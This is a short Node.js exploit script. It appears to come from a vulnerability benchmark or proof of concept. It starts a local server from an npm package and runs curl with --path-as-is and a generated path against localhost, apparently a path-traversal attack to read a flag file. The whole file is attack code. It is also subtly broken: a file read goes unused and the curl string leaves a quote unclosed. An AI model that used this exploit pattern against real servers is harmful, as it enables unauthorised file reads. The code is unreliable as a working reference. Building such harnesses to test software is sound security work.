const { exec } = require("child_process");
const { sleep } = require("sleep");

function exploitFunction({ genstr }) {
  const path = require("path");
  const fs = require("fs");

  let hostsFile = fs.readFileSync(path.resolve(__dirname, "../flag.html")).toString();

  let server = "node ./node_modules/xbhxbh/xbh.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr(50)}`; // Simplified for clarity

  return new Promise((resolve, reject) => {
    exec(attack_string, (error, stdout) => {
      if (error) {
        reject(error);
      } else {
        resolve(stdout);
      }
    });
  });
}

module.exports = { exploitFunction };